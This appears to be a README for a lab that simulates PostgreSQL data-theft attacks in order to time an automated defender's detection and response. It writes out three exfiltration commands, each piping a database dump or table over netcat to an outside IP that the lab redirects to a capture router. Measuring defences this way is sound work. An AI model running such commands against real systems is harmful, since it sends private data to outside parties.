# Data Exfiltration Experiments

This directory contains automated scripts for running data exfiltration experiments to test defender response capabilities.

## Overview

The exfiltration experiments simulate database theft attacks and measure:
- **Detection Time**: Time until SLIPS generates a high-confidence alert
- **Planning Time**: Time to generate an automated response plan
- **Response Time**: Time until OpenCode executes remediation
- **Exfiltration Time**: Time until the last data byte is exfiltrated
- **Total Impact**: Duration of exposure before automated containment

## Experiment Scripts

### Single Experiment
**File**: `scripts/defender_experiments/exfiltration_experiment.sh`

Runs a single end-to-end exfiltration experiment with full monitoring.

```bash
# Run with auto-generated ID
./scripts/defender_experiments/exfiltration_experiment.sh

# Run with custom ID
./scripts/defender_experiments/exfiltration_experiment.sh my_test_001
```

**Features**:
- Automated infrastructure startup (via `make up`)
- Service health verification
- Exfiltration execution on `lab_server`
- Defender monitoring via auto-responder timeline
- Router monitoring for data capture
- 15-minute timeout with cleanup on completion

**Termination Conditions**:
1. Defender executes successful OpenCode response AND no new data received for 30s
2. 15 minutes (900s) elapsed since exfiltration started

**Outputs**:
```
outputs/<EXPERIMENT_ID>/
├── logs/
│   ├── experiment.log          # Main experiment log
│   ├── auto_responder_timeline.jsonl
│   ├── auto_responder_detailed.log
│   └── exfiltration.log        # Exfil command details
├── pcaps/
│   ├── server_*.pcap
│   └── router_*.pcap
└── slips_output/
```

---

### Batch Experiments
**File**: `scripts/defender_experiments/run_multiple_exfil_experiments_forced.sh`

Runs multiple experiments sequentially for statistical analysis.

```bash
# Run default 30 experiments
./scripts/defender_experiments/run_multiple_exfil_experiments_forced.sh

# Run custom number
NUM_EXPERIMENTS=50 ./scripts/defender_experiments/run_multiple_exfil_experiments_forced.sh
```

**Features**:
- Forced execution (continues despite individual failures)
- Automatic experiment ID generation
- Per-experiment output isolation
- Progress tracking and logging

**Outputs**:
```
experiment_output/
└── forced_run_<N>_exp_<timestamp>_<run_id>/
    └── logs/
```

---

### Monitoring Script
**File**: `scripts/defender_experiments/exfiltration_monitor.sh`

Real-time monitoring of data exfiltration progress. Runs inside router container.

```bash
# Run inside router
docker exec lab_server /scripts/exfiltration_monitor.sh

# Custom output location
docker exec lab_server /scripts/exfiltration_monitor.sh /tmp/my_monitor.json
```

**What it monitors**:
- File size growth of exfiltrated data
- Transfer completion detection
- Timeout after 60s of no data
- Stable size detection (30s no growth = complete)

**Output format** (JSON):
```json
{"timestamp":"2025-12-30T12:34:56+00:00","monitor_start":"true"}
{"timestamp":"2025-12-30T12:34:57+00:00","size":"12345"}
{"timestamp":"2025-12-30T12:35:27+00:00","exfil_complete":"12345"}
{"timestamp":"2025-12-30T12:35:27+00:00","final_status":"success"}
```

---

## Analysis Tools

### Plot Experiment Results
**File**: `scripts/defender_experiments/plot_experiment_results.py`

Generates visualizations from experiment results.

```bash
# Plot all experiments in a directory
python3 scripts/defender_experiments/plot_experiment_results.py \
    experiment_output/forced_run_*/

# Custom output location
python3 scripts/defender_experiments/plot_experiment_results.py \
    experiment_output/forced_run_*/ \
    --output analysis_plots/
```

**Generates**:
- Detection time distribution
- Response time metrics
- Success/failure rates
- Timeline comparisons

---

## Exfiltration Methods

The experiments support multiple PostgreSQL exfiltration techniques:

### 1. pg_dump over netcat
```bash
pg_dump -U postgres labdb | nc -w 10 137.184.126.86 666
```

### 2. COPY PROGRAM
```sql
COPY employees TO PROGRAM 'nc -w 10 137.184.126.86 666';
```

### 3. Manual query + netcat
```bash
psql -U postgres -c "SELECT * FROM employees;" | nc 137.184.126.86 666
```

All methods route through the fake public IP (`137.184.126.86`) which is DNAT'd to the router for capture.

---

## Architecture

```
┌─────────────────┐         ┌──────────────────┐         ┌─────────────────┐
│   lab_server    │         │   lab_router     │         │   Defender      │
│  (172.31.0.10)  │────────▶│  (172.31.0.1)    │────────▶│   (SLIPS +      │
│                 │ route   │                  │  alerts │  Auto-responder)│
│  PostgreSQL DB  │         │  DNAT Rule:      │         │                 │
│  - pg_dump      │         │  137.184.126.86  │         │  - Detection    │
│  - COPY PROGRAM │         │  → 172.31.0.1     │         │  - Planning     │
│                 │         │                  │         │  - Remediation  │
└─────────────────┘         └──────────────────┘         └─────────────────┘
        │                            │
        │ Exfil to fake IP           │ nc listener
        ▼                            ▼
   137.184.126.86:666        /tmp/exfil/labdb_dump.sql
   (simulated external)       (captured data)
```

### Traffic Flow

1. **Server** executes exfiltration command targeting `137.184.126.86:666`
2. **Router** receives traffic via static route
3. **DNAT** redirects fake IP to local netcat listener
4. **Router** captures data to `/tmp/exfil/labdb_dump.sql`
5. **SLIPS** on defender detects suspicious traffic patterns
6. **Auto-responder** receives alert and executes response via OpenCode
7. **Monitoring** scripts capture timing metrics at each stage

---

## Measured Metrics

| Metric | Description | Source |
|--------|-------------|--------|
| `t0_exfil_start` | When exfiltration command executed | Attack script |
| `t1_detection` | SLIPS high-confidence alert | `auto_responder_timeline.jsonl` |
| `t2_planning` | Plan generation complete | `auto_responder_timeline.jsonl` |
| `t3_response` | OpenCode execution finish | `auto_responder_timeline.jsonl` |
| `t4_exfil_complete` | Last byte received | Router monitoring |

**Derived timings**:
- Detection latency = `t1 - t0`
- Response latency = `t3 - t1`
- Total exposure = `t4 - t0`

---

## Example Workflow

### Quick Test
```bash
# 1. Start lab
make up

# 2. Run single experiment
./scripts/defender_experiments/exfiltration_experiment.sh quick_test

# 3. View results
cat outputs/quick_test/logs/experiment.log

# 4. Check defender response
jq 'select(.level == "ALERT")' outputs/quick_test/logs/auto_responder_timeline.jsonl

# 5. Analyze PCAP
tcpdump -r outputs/quick_test/pcaps/router_*.pcap -n 'host 137.184.126.86'
```

### Batch Experiments
```bash
# 1. Run 30 experiments
./scripts/defender_experiments/run_multiple_exfil_experiments_forced.sh

# 2. Wait for completion (may take hours)
tail -f /tmp/exfil_forced_runner.log

# 3. Plot results
python3 scripts/defender_experiments/plot_experiment_results.py \
    experiment_output/forced_run_*/

# 4. View statistics
ls -la experiment_output/
```

---

## Troubleshooting

### Experiment hangs
- Check services: `docker ps`
- View logs: `docker logs lab_slips_defender`
- Verify network: `docker exec lab_server ping -c 2 172.31.0.1`

### No alerts generated
- SLIPS may not be running: `docker exec lab_slips_defender ps aux | grep slips`
- Check PCAPs are being captured: `ls -la outputs/<RUN_ID>/pcaps/`
- Verify SLIPS configuration

### Exfiltration not captured
- Router listener not running: `docker exec lab_router ps aux | grep nc`
- DNAT rule missing: `docker exec lab_router iptables-legacy -t nat -L -n`
- Server route missing: `docker exec lab_server ip route | grep 137.184`

### Auto-responder not responding
- Check timeline logs: `tail -f outputs/<RUN_ID>/auto_responder_timeline.jsonl`
- Verify planner: `curl -s http://127.0.0.1:1654/health`
- SSH keys: `docker exec lab_slips_defender ls -la /root/.ssh/`

---

## Related Documentation

- [Data Exfiltration Simulation](./data_exfiltration_simulation.md) - Infrastructure setup
- [DATA_EXFILTRATION_SUMMARY.md](./DATA_EXFILTRATION_SUMMARY.md) - Quick reference
- [Networking](./networking.md) - Network architecture
- [Defender](./defender.md) - Auto-responder system

---

## File Locations

| Purpose | Location |
|---------|----------|
| Experiment scripts | `scripts/defender_experiments/exfiltration_*.sh` |
| Batch runner | `scripts/defender_experiments/run_multiple_exfil_experiments_forced.sh` |
| Plotting tool | `scripts/defender_experiments/plot_experiment_results.py` |
| Experiment outputs | `outputs/<EXPERIMENT_ID>/` |
| Batch outputs | `experiment_output/forced_run_*/` |
| PCAPs | `outputs/<RUN_ID>/pcaps/router_*.pcap` |
